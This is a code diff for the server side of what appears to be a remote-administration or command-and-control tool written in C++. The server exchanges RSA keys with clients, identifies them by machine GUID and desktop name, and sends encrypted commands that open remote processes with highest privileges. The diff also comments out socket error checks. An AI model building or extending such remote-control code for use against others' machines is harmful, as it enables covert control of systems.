@@ -50,36 +50,37 @@ BOOL ServerInterface::ExchangePublicKeys(long cuid) {
 	i2d_RSAPublicKey(this->m_SessionKeys.pub, &data);
 
 	int sent = Send(client->GetSocket(), ( char* ) &len, sizeof(len), 0); // Send size of private key first
-	if ( sent <= 0 ) {
-		free(data);
-		return FALSE;
-	}
+	//if ( sent <= 0 ) {
+	//	free(data);
+	//	return FALSE;
+	//}
 
 	sent = Send(client->GetSocket(), ( char* ) data, len, 0); // send der format of rsa key
-	if ( sent <= 0 ) {
-		free(data);
-		return FALSE;
-	}
+	//if ( sent <= 0 ) {
+	//	free(data);
+	//	return FALSE;
+	//}
 
 	free(data); // i2d_RSAPublicKey mallocs so free it
 
 	// now receive the public key
 	int clientLen = 0;
 	int received = Receive(client->GetSocket(), ( char* ) &clientLen, sizeof(clientLen), 0);
-	if ( received <= 0 )
-		return FALSE;
+	//if ( received <= 0 )
+	//	return FALSE;
 
 	unsigned char* clientDer = ( unsigned char* ) malloc(clientLen);
 	received = Receive(client->GetSocket(), ( char* ) clientDer, clientLen, 0);
-	if ( received <= 0 ) {
-		free(clientDer);
-		return FALSE;
-	}
+	//if ( received <= 0 ) {
+	//	free(clientDer);
+	//	return FALSE;
+	//}
 
 	const unsigned char* constDer = clientDer;
-	
+
 	RSA* rsaPubKey = d2i_RSAPublicKey(nullptr, &constDer, clientLen);
-	
+	std::cout << LGCrypto::RSAKeyToString(rsaPubKey, FALSE) << std::endl;
+
 	client->ClientPublicKey = rsaPubKey;
 
 	std::cout << "got client public rsa key!\n";
@@ -364,41 +365,32 @@ void ServerInterface::TCPReceiveMessagesFromClient(long cuid) {
 		GetClientSaveFile(client->ClientUID);
 
 	SaveServerState();
-	
+	PingClient(cuid);
+
 	// tcp receive main loop
 	std::cout << "[TCP] : Receiving messages from " << cuid << " (" << client->GetMachineGUID() << "/" << client->GetDesktopName() << ")\n";
-	BYTESTRING command = Serialization::SerializeString("C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe ");
-	Packet test;
-	errno_t copied = memcpy_s(test.buffer, MAX_BUFFER_LEN, command.data(), command.size());
-	test.buffLen = command.size();
-	if ( copied != 0 ) {
-		std::cout << "buffer overflow\n";
-	}
-	char buff2[MAX_BUFFER_LEN];
-	memcpy(buff2, test.buffer, MAX_BUFFER_LEN);
-	buff2[command.size() + 1] = '\0';
-	std::cout << buff2 << std::endl;
-
-	BYTESTRING packet = Serialization::SerializeStruct(test);
-	BYTESTRING encrypted = LGCrypto::RSAEncrypt(packet, client->ClientPublicKey, FALSE);
-	NetCommon::TransmitData(encrypted, client->GetSocket(), TCP);
-	std::cout << "?" << std::endl;
 
 	do
 	{
-
-		// get a client response usually after an action is performed on the remote host
 		if ( client->ExpectingResponse ) {
-			client->LastClientResponse = client->RecentClientResponse;
-			client->RecentClientResponse = ReceiveDataFrom<ClientResponse>(client->GetSocket(), TRUE, this->m_SessionKeys.priv);
+			Sleep(100);
 			continue;
 		}
 
-		// receive data from client, decrypt it using their rsa key
-		ClientMessage receivedData = ReceiveDataFrom<ClientMessage>(client->GetSocket(), TRUE, this->m_SessionKeys.priv);
-		std::cout << "received a message from a client on tcp\n";
+		BYTESTRING encrypted;
+		BYTESTRING decrypted;
+		ClientRequest request;
 
-		BOOL performed = PerformRequest(receivedData, this->m_TCPServerDetails, cuid);
+		BOOL received = NetCommon::ReceiveData(encrypted, client->GetSocket(), TCP);
+		decrypted = LGCrypto::RSADecrypt(encrypted, this->m_SessionKeys.priv, TRUE);
+		if ( !LGCrypto::GoodDecrypt(decrypted) )
+			continue;
+
+		request = Serialization::DeserializeToStruct<ClientRequest>(decrypted);
+
+		std::cout << "Received request" << std::endl;
+
+		BOOL performed = PerformRequest(request, this->m_TCPServerDetails, cuid);
 	} while ( client->Alive );
 }
 
@@ -456,13 +448,12 @@ BOOL ServerInterface::HandleUserInput(unsigned int command, ServerCommand& outpu
 	cmdInfo.action = static_cast<RemoteAction>(command);
 
 	switch ( command ) {
-	case RemoteAction::KOpenElevatedProcess:
-		std::cout << "Opening elevated remote process.\n";
-		std::cout << "Enter arguments for command line: " << std::endl;
 	case RemoteAction::kOpenRemoteProcess: {
 		std::string input;
+		std::cout << "opening process\n";
 		std::cin >> input;
 		std::cout << "your input: " << input << std::endl;
+		cmdInfo.flags = RUN_AS_HIGHEST | USE_CLI | PACKET_IS_A_COMMAND;
 		cmdInfo.insert(input);
 		performed = TRUE;
 		break;		
@@ -657,14 +648,14 @@ BOOL ServerInterface::StartServer(Server& server) {
 		std::thread acceptThread(&ServerInterface::AcceptTCPConnections, this);
 		acceptThread.detach(); // run accept thread even after this function returns
 
-		this->SendCommandsToClients();
+		//this->SendCommandsToClients();
 	}
 	// otherwise if not tcp server then listen for udp messaages
 	else if ( server.type == SOCK_DGRAM ) {
 		this->m_UDPServerDetails = server;
 
 		std::thread receiveThread(&ServerInterface::ListenForUDPMessages, this);
-		receiveThread.detach();
+		receiveThread.detach(); 
 	}
 
 	std::cout << "Done!" << std::endl;
@@ -696,15 +687,24 @@ ClientResponse ServerInterface::WaitForClientResponse(long cuid) {
 
 	client->ExpectingResponse = TRUE;
 
-	// wait until new client response
-	do {
-		Sleep(500); // wait 500 ms
-	} 
-	while ( client->RecentClientResponse.id != client->LastClientResponse.id );
+	BYTESTRING encrypted;
+	BYTESTRING decrypted;
+	ClientResponse response;
+	
+	BOOL received = NetCommon::ReceiveData(encrypted, client->GetSocket(), TCP);
+	if ( !received )
+		return {};
+	
+	std::cout << "Received a 'ClientResponse'" << std::endl;
 
+	decrypted = LGCrypto::RSADecrypt(encrypted, this->m_SessionKeys.priv, TRUE);
+	if ( !LGCrypto::GoodDecrypt(decrypted) )
+		return {};
+
+	response = Serialization::DeserializeToStruct<ClientResponse>(decrypted);
 	client->ExpectingResponse = FALSE;
 
-	return client->RecentClientResponse;
+	return response;
 }
 
 /**
@@ -770,13 +770,19 @@ ClientResponse ServerInterface::PingClient(long cuid) {
 	if ( client->GetSocket() == INVALID_SOCKET ) // socket isnt ready so cant ping.
 		return {};
 
+	std::cout << "Pinging " << cuid << std::endl;
+
 	// send the ping to the client over tcp
 	ServerCommand pingCommand;
 	pingCommand.action = RemoteAction::kPingClient;
+	pingCommand.flags = RESPOND_WITH_STATUS;
+	pingCommand.buffLen = 0;
 	
-	BOOL sent = TCPSendMessageToClient(cuid, pingCommand);
+	BOOL sent = NetCommon::TransmitData(pingCommand, client->GetSocket(), TCP, NetCommon::_default, TRUE, client->ClientPublicKey, FALSE);
 	if ( !sent )
 		return {};
+
+	std::cout << "Sent ping. Waiting for response..." << std::endl;
 
 	return WaitForClientResponse(cuid);
 }
